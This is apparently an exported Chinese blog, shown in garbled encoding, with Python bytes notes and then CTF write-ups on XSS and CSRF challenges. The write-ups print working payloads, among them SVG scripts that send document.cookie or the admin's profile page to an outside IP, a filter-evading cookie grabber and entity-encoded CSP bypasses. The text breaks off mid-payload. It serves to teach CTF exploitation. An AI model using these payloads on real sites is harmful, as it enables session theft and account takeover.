<p>å› ä¸ºåšå¯†ç å­¦è¯¾è®¾çš„ç¼˜æ•…, å…¨ç»„æˆå‘˜ç»Ÿä¸€ä½¿ç”¨python3æ¥ç¼–å†™ä»£ç , åœ¨ç¼–å†™è¿‡ç¨‹ä¸­ç¼–ç æ˜¯ä¸ªå¤§é—®é¢˜, å› æ­¤åœ¨è¿™é‡Œåšä¸€ä¸ªå¤‡å¿˜</p>
<p>python3ä¸­stringç±»å‹å’Œbytesç±»å‹å·²ç»æ˜ç¡®åˆ†å¼€æ¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = &apos;1233&apos;</span><br><span class="line">a = u&apos;1233&apos;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸¤è€…æ˜¯ç­‰æ•ˆçš„, éƒ½æ˜¯stringç±»å‹, ç¼–ç æ˜¯unicodeç¼–ç , bytesç±»å‹å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;\x001233&apos;</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸€ä¸ªbyteséƒ½æ˜¯ç”±å…«ä¸ªæ¯”ç‰¹ä½æ¥è¡¨ç¤ºä»–çš„asciiç .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(type(i))</span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>
<p>ä½ ä¼šå‘ç°bytesç±»å‹çš„aä¸­å–å‡ºå•ä¸ªå…ƒç´ å‡ºæ¥, ä»–çš„ç±»å‹ä¼šå˜æˆint, è€Œä¸”printçš„æ—¶å€™ä¹Ÿä¼šè¾“å‡ºint, ä½†æ˜¯å¦‚æœæ˜¯åˆ‡ç‰‡çš„è¯, æˆªå–çš„ç»“æœå´è¿˜æ˜¯bytes.</p>
<p>æ¥ä¸‹æ¥æ˜¯è½¬æ¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = b&apos;12334\x00&apos;</span><br><span class="line"># convert bytes to int</span><br><span class="line">b = int.from_bytes(a, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to bytes</span><br><span class="line">c = int.to_bytes(length=6, byteorder=&apos;big&apos;)</span><br><span class="line"># convert int to binarry string</span><br><span class="line">d = bin(b)[2:]</span><br><span class="line"># convert binarry string to int</span><br><span class="line">int(d, base=2)</span><br></pre></td></tr></table></figure>
<h2 id="linux">linux</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser ch4ser</span><br><span class="line">adduser ch4ser sudo</span><br></pre></td></tr></table></figure>
<h2 id="å…³äºdockerå’ŒHyperVæ— æ³•å¯åŠ¨çš„é—®é¢˜">å…³äºdockerå’ŒHyperVæ— æ³•å¯åŠ¨çš„é—®é¢˜</h2>
<ul>
<li>
<p>BIOS ä¸­ç¡®å®šè™šæ‹ŸåŒ–åŠŸèƒ½å…¨éƒ¨æ‰“å¼€</p>
</li>
<li>
<p>windows featureä¸­å¯åŠ¨HyperV</p>
</li>
<li>
<p>å¦‚æœå¤±è´¥å°è¯•ä»¥ä¸‹å‘½ä»¤:</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dism.exe /Online /Enable-Feature:Microsoft-Hyper-V /All</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>å¦‚æœè¿™ä¸ªä¹Ÿä¸è¡Œçš„è¯</p>
</li>
<li>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype auto</span><br><span class="line">ç„¶åé‡å¯</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>ä»¥ä¸Šå‘½ä»¤éƒ½è¦ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œ</p>
</li>
</ul>
<h2 id="åˆ‡æ¢apache2-çš„phpç‰ˆæœ¬">åˆ‡æ¢apache2 çš„phpç‰ˆæœ¬</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo a2dismod php7.0</span><br><span class="line">sudo a2enmod php7.1</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>XSS & CSRF é¢˜å‹è®°å½•[working forever]</title>
    <url>/2019/04/22/XSS%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="CISCN-2019-åä¸œåŒ—èµ›åŒº-web2">CISCN 2019 åä¸œåŒ—èµ›åŒº web2</h2>
<p>æ³¨å†Œç™»å½•ï¼Œ æœ‰æŠ•ç¨¿å’Œåé¦ˆåŠŸèƒ½ï¼Œ æŠ•ä¸ªç¨¿è¯•è¯•</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70881416-7485b100-2007-11ea-899f-9336636cfc90.png" alt="image"></p>
<p>æŠ•å®Œå¯ä»¥çœ‹è‡ªå·±çš„ç¨¿ä»¶ï¼Œ å‘ç°æ²¡æœ‰è§¦å‘ï¼Œ çœ‹çœ‹ä»€ä¹ˆæƒ…å†µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;script&gt;alertï¼ˆ1ï¼‰&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>å—¯, æ‹¬å·è¢«è½¬æˆä¸­æ–‡çš„æ‹¬å·äº†.</p>
<p><strong>ä½¿ç”¨svgç‰¹æ€§(xmlè‡ªåŠ¨è§£æhtmlå®ä½“ç¼–ç )æ­é…htmlå®ä½“ç¼–ç æ¥ç»•è¿‡waf</strong></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70881794-aa776500-2008-11ea-8e5c-4b4c7f301b83.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883020-a6e5dd00-200c-11ea-8ca6-c711d5728c96.png" alt="image-20191216133320204"></p>
<p>ç„¶åæ¥åˆ°åé¦ˆé¡µé¢ï¼Œ å°†è¿™ä¸ªhtmlé¡µé¢çš„urlåé¦ˆç»™ç®¡ç†å‘˜</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883084-d4cb2180-200c-11ea-97d2-df4c7d45b503.png" alt="image-20191216133436010"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000001</span>):</span><br><span class="line">    s = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">"b64628"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±å¯ä»¥è·å¾—cookie, ä¹‹åæ‰«ææˆ–è€…çŒœæµ‹å¯ä»¥å‘ç°<strong>admin.php</strong> , å¸¦ç€cookieå»è®¿é—®, æ˜¯ä¸€ä¸ªç”¨æˆ·æŸ¥è¯¢, ç®€å•çš„sqlæ³¨å…¥è€Œå·², å°±ä¸è¯´äº†.</p>
<h2 id="web50">web50</h2>
<p>é¦–å…ˆæˆ‘ä»¬è¿›å…¥é¡µé¢ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªæ–‡æœ¬æ¡†ï¼ŒæŸ¥çœ‹æºç å¯ä»¥å¾—çŸ¥è¿™æ˜¯æ³¨å†Œç™»é™†æ¡†ã€‚æˆ‘ä»¬éšä¾¿æ³¨å†Œä¸€ä¸ªã€‚<br>
ç„¶åæœ‰ä¸¤ä¸ªé€‰é¡¹<code>profile</code>å’Œ<code>report bug</code>ï¼Œå‰è€…è®°å½•äº†æˆ‘ä»¬çš„è´¦æˆ·ä¿¡æ¯ã€‚</p>
<p>åè€…åŒ…å«äº†ä¸€ä¸ªæ–‡æœ¬æ¡†ï¼Œæäº¤ä¸€äº›ä¸œè¥¿ä¹‹åæ˜¾ç¤º<code>admin will take a look, blah blah, you know what it means</code>ï¼Œå¯ä»¥æ¨æµ‹æˆ‘ä»¬<code>ä¸Šä¼ çš„ä¸œè¥¿éƒ½ä¼šè¢«ç®¡ç†å‘˜æŸ¥çœ‹</code>ï¼Œé‚£ä¹ˆå­˜åœ¨<code>client-attack</code>ï¼Œæœ€æœ‰å¯èƒ½æ˜¯xssæ”»å‡»äº†ã€‚</p>
<p>ç„¶ååœ¨å‡ ä¸ªåœ°æ–¹å°è¯•XSSæ³¨å…¥ï¼Œå‘ç°ä¸Šä¼ çš„æ–‡ä»¶ä¸­å¯ä»¥ä¼ å…¥xssè„šæœ¬ï¼Œå¹¶ä¸”å¯ä»¥æ‰§è¡Œï¼ŒéªŒè¯è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">'XSS!'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
<p>åœ¨å‘é€ä¹‹åã€‚æˆ‘ä»¬è¦æŠŠä¸Šä¼ æ–‡ä»¶çš„<code>url</code>é€šè¿‡<code>report bug</code>ä¸Šä¼ ç»™ç®¡ç†å‘˜ã€‚<br>
æ³¨æ„<code>content-typeåé¢éœ€è¦ç©ºä¸€è¡Œï¼Œcontent-typeçš„ç±»å‹ä¹Ÿè¦å£°æ˜æˆimage/svg+xml</code>ï¼Œé€šè¿‡è®¿é—®å›æ˜¾å‡ºæ¥çš„å›¾ç‰‡urlå¯ä»¥å‘ç°æ‰§è¡ŒæˆåŠŸã€‚</p>
<p>ä¸‹ä¸€æ­¥å°è¯•å°†æ‹¿adminçš„<code>cookie</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.open(<span class="string">"http://207.148.64.125:1234/?$&#123;document.cookie&#125;"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
<p>ç„¶åæœåŠ¡å™¨ä¸Šå¼€ncæœåŠ¡ç›‘å¬ã€‚ä½†æ˜¯å¹¶æ²¡æœ‰ä¸œè¥¿å›æ˜¾ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯å› ä¸º<code>httponly</code>çš„ç¼˜æ•…ã€‚<code>åœ¨httponlyä¸‹ï¼Œjsæ˜¯æ— æ³•æ“ä½œcookieçš„</code>ã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œç®¡ç†å‘˜åœ¨è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„ä¸œè¥¿çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„è„šæœ¬å¯ä»¥è®©ä»–å»è®¿é—®ä»–è‡ªå·±çš„profileï¼Œè€Œä¸”åœ¨è®¿é—®çš„æ—¶å€™è‚¯å®šæ˜¯æºå¸¦è‡ªå·±çš„cookieçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­å°†ä»–è®¿é—®ä¹‹åå¾—åˆ°çš„å†…å®¹ç›´æ¥å‘é€åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·ç»•è¿‡äº†cookieå®‰å…¨ç­–ç•¥.(<code>åŸæœ¬å¸¸è§„åšæ³•æ˜¯å…ˆè·å–cookieç„¶åäº²è‡ªå»è®¿é—®profileçš„,ä½†æ˜¯è¿™æ¬¡æˆ‘ä»¬ç›´æ¥è®©adminè‡ªå·±å»è®¿é—®profile,çœå´äº†è·å–cookieçš„ç¯èŠ‚, cookieæ˜¯è¢«å€Ÿç”¨è€Œä¸æ˜¯è¢«ç›—å–, è¿™å°±æ˜¯csrfçš„å¤§è‡´æƒ³æ³•</code>)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">          xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://url:port/"</span>);</span></span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line"><span class="javascript">      xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">      xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">      xhr.send();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>url:port</code>æ¨èä½¿ç”¨<code>burpsuite</code>çš„<code>burpcollaborator</code>ï¼Œä½†æ˜¯æˆ‘çš„ç‚¸äº†ï¼Œæ‰€ä»¥é€‰æ‹©ä½¿ç”¨è‡ªå·±çš„æœåŠ¡å™¨ï¼Œä½¿ç”¨<code>nc -lvvkp 1234</code>æ¥ç›‘å¬ä¿¡æ¯ã€‚å¦‚æœä¸€æ¬¡ä¸è¡Œå¯ä»¥å†é‡æ¥ä¸€ä¸‹ï¼Œæˆ‘è¯•äº†ä¸¤æ¬¡å°±å‡ºæ¥äº†flagã€‚</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883205-2c698d00-200d-11ea-9861-f5556e015024.png" alt="image"></p>
<blockquote>
<p>å…³äºè¿™é“é¢˜ç›®çš„ä¸€ç‚¹æ€è€ƒ:</p>
<p>ç»è¿‡æœç´¢, æˆ‘å‘ç°XMLHttprequesté»˜è®¤æƒ…å†µä¸‹å…è®¸å‘ä¸åŒæºå‘é€è¯·æ±‚, ä½†æ˜¯åŒæºç­–ç•¥ä¼šé˜»æ­¢è¯»å–å“åº”å†…å®¹, è¿™ä¼¼ä¹å¹¶ä¸é‡è¦, é‡è¦çš„æ˜¯æˆ‘ä»¬çš„è¯·æ±‚æ˜¯å¦å¯ä»¥å°†æˆ‘ä»¬æƒ³è¦å‘é€çš„httponly-cookieå‘é€å‡ºå», åœ¨webå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜è¿™æœ¬ä¹¦ä¸­,æåˆ°äº†,å¦‚æœè¦å¸¦ä¸Šä¼šè¯ä¿¡æ¯æ¥å‘é€è¯·æ±‚, å°±è¦è®¾ç½®withCredentialsçš„å€¼ä¸ºtrue.</p>
<p>è®¾ç½®HttpOnlyå±æ€§ï¼ŒCookieç›—çªƒçš„å¨èƒå¹¶æ²¡æœ‰å½»åº•æ¶ˆé™¤ï¼Œå› ä¸ºcookieè¿˜æ˜¯æœ‰å¯èƒ½ä¼ é€’çš„è¿‡ç¨‹ä¸­è¢«ç›‘å¬æ•è·åä¿¡æ¯æ³„æ¼, åœ¨è¿™é“é¢˜ä¸­å°±æ˜¯è¿™æ ·.</p>
</blockquote>
<h2 id="eXquisite-Scenery-Sites-boot2root">eXquisite Scenery Sites(boot2root)</h2>
<p>è¿™æ˜¯ä¸€é“xssé¢˜ç›®ï¼Œæ³¨å…¥ç‚¹åœ¨<code>username</code>ä¸Šé¢ï¼Œæœ‰é•¿åº¦é™åˆ¶<code>80</code>å­—ç¬¦ï¼Œè¿‡æ»¤å…³é”®å­—ï¼š<code>scipt</code>å’Œ<code>.</code>ï¼Œ<code>script</code>å¤§å°å†™ç»•è¿‡ï¼ŒåŸæ¥çš„<code>document.cookie</code>æ”¹å†™æˆ<code>document['cookie']</code>ï¼Œ<br>
å°†<code>ipåœ°å€è½¬åŒ–ä¸ºé•¿æ•´æ•°ç±»å‹</code>ï¼Œçœç•¥httpæ¥èŠ‚çœé•¿åº¦ç©ºé—´ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user=1&amp;Message=&lt;scriPt&gt;document[&apos;location&apos;]=&apos;//3482599549:8/?&apos;%2bdocument[&apos;cookie&apos;];&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Rctf-rblog">Rctf rblog</h2>
<p>ç‚¹å‡»æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°<code>rblog.js</code> ï¼Œè¿›å…¥çœ‹çœ‹ï¼Œé‡Œé¢æä¾›äº†ä¸€ä¸ª<code>/api/v2/posts</code> ã€‚</p>
<p>è®¿é—®ä¹‹åæŠŠ<code>posts</code> æ¢æˆå…¶ä»–çš„ä¸œè¥¿ï¼Œå‘ç°<code>v2/</code>åé¢çš„å†…å®¹ä¼šä»¥å­—ç¬¦ä¸²å½¢å¼å‘ˆç°ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²çš„å¼€å¤´åŠ ä¸Šäº†æ–œæ†ã€‚å°è¯•http://rblog.2019.rctf.rois.io/api/v2/aaaaa<img>  æˆ–è€…æ˜¯å…¶ä»–çš„æ ‡ç­¾æ¥éªŒè¯æ˜¯å¦å­˜åœ¨åå°„æ€§XSSï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§£æ ï¼Œåœ¨<code>header</code> éƒ¨åˆ†å¦‚ä¸‹ï¼š</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png" alt="image"></p>
<p>è¿”å›çš„æ•°æ®ä¾æ—§æ˜¯<code>application/json</code> è¯´æ˜å›¾ç‰‡æ ‡ç­¾å¹¶æ²¡æœ‰è¢«è§£æã€‚</p>
<p>ç„¶åéœ€è¦ä¸€ç‚¹è„‘æ´ï¼Œæˆ–è€…æœç´¢èƒ½åŠ›ï¼Œ<code>v2</code> æ˜¯ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆæ¢æˆ<code>v1</code> è®¿é—®è¯•ä¸€è¯•ã€‚åŒæ ·æµ‹è¯•æ˜¯å¦å­˜åœ¨åå°„XSS æ¼æ´ ï¼š <a href="https://rblog.2019.rctf.rois.io/api/v1/" target="_blank" rel="noopener">https://rblog.2019.rctf.rois.io/api/v1/</a><img>ï¼Œè¿™æ¬¡è¿”å›å¦‚ä¸‹</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png" alt="image"></p>
<p>çœ‹ï¼Œ<code>&lt;img&gt;</code> ä½œä¸º<code>html</code> æ ‡ç­¾è§£æäº†ï¼Œä½†æ˜¯è¿˜æœ‰<code>csp</code> éœ€è¦ç»•è¿‡</p>
<p><code>Content-Security-Policy: default-src 'self'; object-src 'none'</code></p>
<p>ç„¶åçœ‹é¢˜ç›®ç»™çš„æç¤ºï¼š</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; API supports JSONP.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>å…³äº<code>JSONP</code> å’Œ<code>callback</code> ï¼Œæˆ‘çœ‹åˆ°äº†ä¸€æ®µè¯ï¼Œæœ‰åŠ©äºç†è§£ï¼š</p>
<blockquote>
<p>å®¢æˆ·ç«¯æŠŠå›è°ƒå‡½æ•°çš„åå­—ä¼ é€ç»™æœåŠ¡ç«¯ï¼Œ<br>
ç„¶åæœåŠ¡ç«¯ç”Ÿæˆä¸€æ®µjsä»£ç ä¸”ä»£ç ä¸­åŒ…å«ç€å¯¹å›è°ƒå‡½æ•°çš„è°ƒç”¨ï¼Œ<br>
ç„¶åæœåŠ¡ç«¯æŠŠè¿™æ®µä»£ç è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œ<br>
ç„¶åå®¢æˆ·ç«¯æ‰§è¡Œè¿™æ®µä»£ç çš„è¿‡ç¨‹ä¸­è°ƒç”¨äº†å›è°ƒå‡½æ•°ï¼Œ<br>
ç„¶åä½ å°±å¯ä»¥åœ¨å›è°ƒå‡½æ•°é‡Œé¢å¤„ç†æ•°æ®äº†</p>
</blockquote>
<p>ç»“åˆä¸‹é¢å‡ ä¸ªé“¾æ¥åº”è¯¥å°±å¯ä»¥å¼„æ‡‚äº†ã€‚</p>
<p><a href="https://www.zhihu.com/question/20235590" target="_blank" rel="noopener">https://www.zhihu.com/question/20235590</a></p>
<p><a href="http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" target="_blank" rel="noopener">http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html</a></p>
<p><a href="https://juejin.im/entry/59f2f4ec518825411570156c" target="_blank" rel="noopener">https://juejin.im/entry/59f2f4ec518825411570156c</a></p>
<p>æµ‹è¯•ä¸€ä¸‹<code>https://rblog.2019.rctf.rois.io/api/v1/posts?callback=test</code>ï¼Œè¿”å›ï¼š</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png" alt="image"></p>
<p><code>callback</code> åé¢çš„å‚æ•°ä¼šåŒ…è£¹ç½‘é¡µå†…å®¹å¹¶å‘ˆç°åœ¨ç½‘é¡µä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨åå°„å‹çš„XSSã€‚</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58321250-3b5dd780-7e50-11e9-8fc2-fa4ff8d9a4ee.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°æ–œæ†è¢«è½¬ä¹‰äº†ã€‚ã€‚ã€‚æŠŠ``script``éƒ¨åˆ†æ¢æˆå…¶ä»–ç¬¦å·æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°``,`` ``&quot;`` ``/``ä¹Ÿè¢«è½¬ä¹‰äº†ï¼Œé€‰æ‹©``html``ç¼–ç å¯ä»¥ç»•è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">```&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure>
<p>å†…å®¹æ˜¯ï¼š</p>
<figure class="highlight plain"><figcaption><span>srcdoc</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ç›¸å½“äºæŠŠ``alert(1);console.lot(XXXXXXXXXXX)`` å‘ˆç°åœ¨é¡µé¢ä¸Šä¹‹åæŠŠä»–ä»¬å½“åšscriptè„šæœ¬æ‰§è¡Œã€‚å½“ç„¶ï¼Œä¼ å…¥ä¹‹å‰è¦å…ˆè¿›è¡Œurlç¼–ç ï¼Œæ¯•ç«Ÿäº•å·ä¼šè¢«è§†ä¸ºé”šç‚¹ã€‚</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365573-0063ae80-7ef9-11e9-94e9-7e1f6df04af7.png)</span><br><span class="line"></span><br><span class="line">åœ¨``firefox``è¡Œå¾—é€šï¼Œä½†æ˜¯åœ¨``chrome``ä¸‹é¢ä¼šè¢«æ‹¦æˆªã€‚</span><br><span class="line"></span><br><span class="line">å…³äº``XSS-Auditor`` æˆ‘æ‰¾åˆ°ä»¥ä¸‹ä¸€æ®µè¯ï¼š</span><br><span class="line"></span><br><span class="line">&gt; XSS Auditor takes a black list approach to identify dangerous characters and tags supplied in request parameters. It also attempts to match query parameters with content to identify injection points. If the query parameter canâ€™t be matched to content in the response, the auditor will not be triggered. Because the browser will never have insight to server-side code, an application that mangles an XSS payload will always render the XSS auditor useless in preventing attacks.</span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåç«¯å¯¹æˆ‘ä»¬è¾“å…¥çš„urlè¿›è¡Œäº†æŸç§å¤„ç†çš„è¯ï¼Œå°±å¯ä»¥å¯¼è‡´urléƒ¨åˆ†å’Œé¡µé¢å†…å®¹éƒ¨åˆ†ä¸ä¸€è‡´ï¼Œä»è€Œæ„æˆå¯¹``XSS-auditor`` çš„ç»•è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆè¿›è¡Œä¸€æ³¢fuzzã€‚å‘ç°ä¸­æ–‡ç¬¦å·ï¼ˆæ¯”å¦‚``ï¿¥`` ``Â·`` ``ã€‚`` ``ï¼Œ`` ï¼‰éƒ½ä¼šè¢«è½¬æˆç±»ä¼¼äºå¦‚ä¸‹çš„å½¢å¼</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365956-1031c180-7efe-11e9-95a2-ed16f8970795.png)</span><br><span class="line"></span><br><span class="line">é‚£ä¹ˆæœ€åçš„payloadå°±æ˜¯ï¼š</span><br><span class="line"></span><br><span class="line">```https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=(å¾ˆå¤šä¸ªä¸­æ–‡å¥å·)%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%